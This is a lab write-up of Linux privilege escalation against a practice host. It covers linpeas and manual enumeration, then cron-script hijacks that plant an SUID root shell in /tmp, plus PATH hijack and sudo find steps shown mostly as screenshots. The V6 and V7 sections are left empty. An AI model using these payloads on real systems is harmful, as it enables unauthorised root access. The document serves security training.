<img width="685" height="133" alt="image" src="https://github.com/user-attachments/assets/56d4ebcd-581b-4787-813b-b09c39577804" /># Linux Privilege Escalation 

## Phase 0: Foothold & Enumeration

### Connecting to the Remote Host

```bash
ssh -p 10019 bthomas@192.168.3.205
```

<img width="347" height="63" alt="SSH connection" src="https://github.com/user-attachments/assets/841367df-277e-4eb5-a9cb-9490c16d5b52" />

### Initial Foothold Enum

First thing after landing on a host: establish who you are and what you're allowed to run as root.

```bash
id          # user, groups, uid/gid
sudo -l     # commands you may run via sudo
```

<img width="1031" height="156" alt="id and sudo -l output" src="https://github.com/user-attachments/assets/7260cf38-de8d-4e75-afa5-d5c21a7fd0f8" />

### Transferring linpeas.sh to the Target

Push linpeas from the Kali VM to the target over SSH:

```bash
# On Kali, from the directory containing linpeas.sh:
scp -P 10019 linpeas.sh bthomas@192.168.3.205:/tmp/
```

Confirm it transferred and is executable. Add the execute bit if needed:

```bash
ls -la /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh      # only if it isn't already executable
```

Run it and tee the output to a file, this methods maintains colored output:

```bash
bash /tmp/linpeas.sh &> /tmp/linpeas.out    # &> captures stdout + stderr
less -R /tmp/linpeas.out                    # -R renders ANSI colors
```

---

### Automated Enumeration (linpeas Findings)

linpeas surfaced the following. Each maps to one of the lab's exploitation vectors.

#### SUID Binaries — *(V7: SUID Python)*
Found under **"Files with Interesting Permissions."** Note `/opt/lab/bin/python3`.

<img width="692" height="32" alt="SUID binaries" src="https://github.com/user-attachments/assets/c0cf7e64-eabc-4215-b22b-32e1187cc9da" />

#### Writable Directory & Files — *(V1 / V3 / V4 / V5 / V6)*
Found under the permissions section.

<img width="933" height="71" alt="Writable directory" src="https://github.com/user-attachments/assets/d29556b7-7d3a-460d-bfdc-aee86c37ceb6" />

<img width="996" height="123" alt="Writable files" src="https://github.com/user-attachments/assets/15829ffd-6a88-4bb0-84da-98964793c369" />

#### Cron Jobs — *(V1 / V3 / V4)*
Found under **"Check for vulnerable cron jobs under /etc/cron.d."**

<img width="475" height="52" alt="Cron jobs" src="https://github.com/user-attachments/assets/8c7db8f7-3d38-4632-b989-c5f061ec9aa8" />

#### sudo Permissions — *(V2: sudo find wildcard)*
Found under **"sudo -l, /etc/sudoers, and /etc/sudoers.d."**

<img width="446" height="47" alt="sudo permissions" src="https://github.com/user-attachments/assets/ee7958d8-7d80-4260-9655-7b744f2f149f" />

#### Writable PATH Entry — *(V5: PATH hijack)*
Found under **"Files (scripts) in /etc/profile.d/."** A world-writable dir prepended to root's PATH.

<img width="446" height="35" alt="Writable PATH" src="https://github.com/user-attachments/assets/28928567-d2ab-4a4f-9cb1-275419d37746" />

---

### Manual Enumeration & Confirmation

The commands below reproduce (and confirm) linpeas's findings by hand — useful both as a cross-check and for understanding *why* each item is a finding.

#### User context and sudo rights
```bash
id; sudo -l
```
Shows the current user, group memberships, and what may be run as root.

<img width="1021" height="132" alt="id; sudo -l" src="https://github.com/user-attachments/assets/69c0a6aa-a5d3-47d5-9935-ba2a5c84d456" />

#### SUID binaries
```bash
find / -perm -4000 -type f 2>/dev/null
```
Lists every SUID binary. Note the out-of-place `/opt/lab/bin/python3`.

<img width="493" height="452" alt="find SUID" src="https://github.com/user-attachments/assets/46bece36-cdad-453a-88ab-a6bbbd20d165" />

#### Root-scheduled cron jobs
```bash
ls -la /etc/cron.d/ /etc/crontab
```
Lists the cron definition files root runs.

<img width="445" height="234" alt="ls cron.d" src="https://github.com/user-attachments/assets/608abf94-86ff-4de0-a898-f141184b669e" />

```bash
grep -R "" /etc/cron.d/ 2>/dev/null
```
Prints the contents of each cron file. Note `/opt/lab/bin/backup.sh`.

<img width="1222" height="506" alt="grep cron.d" src="https://github.com/user-attachments/assets/e9f09c72-9956-4d69-acf3-a317e951f6df" />

#### Writable directories
```bash
find /opt /usr/local /etc -writable -type d 2>/dev/null
```
Directories the current user can write to.

<img width="605" height="62" alt="writable dirs" src="https://github.com/user-attachments/assets/5b393112-04c5-43c2-a158-7511643bac35" />

#### Writable root-owned files
```bash
find /opt /etc -writable -type f 2>/dev/null
```
Files the current user can modify that root relies on.

<img width="505" height="57" alt="writable files" src="https://github.com/user-attachments/assets/ce7a0a1e-c695-4d04-a94d-35ad3d639d4b" />

#### PATH manipulation
```bash
cat /etc/profile.d/*.sh
```
Most output is the default. However, the critical line is the last one:

```bash
export PATH="/opt/lab/bin:$PATH"
```

This prepends the world-writable `/opt/lab/bin` to PATH for every login shell which includes root's.

<img width="295" height="25" alt="writable PATH line" src="https://github.com/user-attachments/assets/e6e0018e-5de2-41e0-b7e9-db4f0d314d7b" />

---

## V1 - Writable Directory + Root Cron (Script Hijack)
First, lets run some confirmation commands to make sure the file and permissions are correct:

<img width="442" height="118" alt="image" src="https://github.com/user-attachments/assets/9330f965-d710-4b2d-bdea-ddbc1b00e751" />

Now lets see what the original backup.sh has in it with `cat /opt/lab/bin/backup.sh`. This shows the following (done in writing for easy copy and paste to restore the original when done):
```
#!/bin/bash
echo "backup done" > /tmp/backup.log
```
Now we just need to replace the contents with the following:
```
cat > /opt/lab/bin/backup.sh <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell && chmod u+s /tmp/rootshell
EOF
chmod +x /opt/lab/bin/backup.sh
```
Then wait 5 min until running the following cmd to confirm escalation:

<img width="654" height="85" alt="image" src="https://github.com/user-attachments/assets/c4ef3602-6b0b-4477-b509-91ce0d60a7ef" />

Clean Up:

From the rootshell run
```
cat > /opt/lab/bin/backup.sh <<'EOF'
#!/bin/bash
echo "backup done" > /tmp/backup.log
EOF
```
Then run:
```
rm -f /tmp/rootshell
exit
```
## V2 - sudo NOPASSWD Wildcard Command (find)
Confirm vuln:

<img width="1016" height="140" alt="image" src="https://github.com/user-attachments/assets/600aa805-9dfe-4f28-80f5-cf4116f4f2ed" />

Proof of exploitation:

<img width="610" height="70" alt="image" src="https://github.com/user-attachments/assets/c55dfa6e-83ee-44b6-9534-3e60760a4be3" />

## V3 - World-Writable Root Cron Script
Confirmation checks:

<img width="834" height="362" alt="image" src="https://github.com/user-attachments/assets/f0d52025-2a1e-4ead-b797-b9d31d14fce6" />

Exploitation:

Overwrite the rotate.sh file with:
```
cat > /opt/lab/scripts/rotate.sh <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell && chmod u+s /tmp/rootshell
EOF
```
Wait 5 min then:

<img width="659" height="84" alt="image" src="https://github.com/user-attachments/assets/363cf378-83a9-41aa-b194-20f424a1180c" />

Clean up the lab in the same manner as V1.

## V4 - Missing Binary on a Writable Path

Confirm Vuln (note the lack of the file is exactly what we want):

<img width="546" height="127" alt="image" src="https://github.com/user-attachments/assets/18cb558b-3d3e-4608-b10d-af50c6f1b17d" />

Create the expected file with a payload:

<img width="458" height="83" alt="image" src="https://github.com/user-attachments/assets/7c66fc89-86d1-4cb5-851e-61edbc172c96" />

Confirm exploitation:

<img width="646" height="126" alt="image" src="https://github.com/user-attachments/assets/e0903dc0-0e2e-43ac-93b2-cc9a488c74f0" />

Cleanup:

<img width="332" height="49" alt="image" src="https://github.com/user-attachments/assets/abe44eae-37a4-4088-b01b-9096c08429d6" />

## V5 - Root PATH Hijack (profile.d)

Confirm Vuln:

<img width="896" height="131" alt="image" src="https://github.com/user-attachments/assets/966fcf08-1899-473b-8d47-fbed2b55dc66" />

Insert fake `ls`:

<img width="458" height="121" alt="image" src="https://github.com/user-attachments/assets/ebe4fa95-95a8-499e-855e-a96f866f1d97" />

Exploitation proof:

<img width="644" height="168" alt="image" src="https://github.com/user-attachments/assets/f11cba94-ebd3-40ba-b30f-bf919c3300ed" />

Cleanup:

<img width="306" height="66" alt="image" src="https://github.com/user-attachments/assets/5e719bbb-7f57-49f8-a1fa-545a5f36a768" />

## V6 - World-Writable MOTD Directory


## V7 - SUID Python Binary
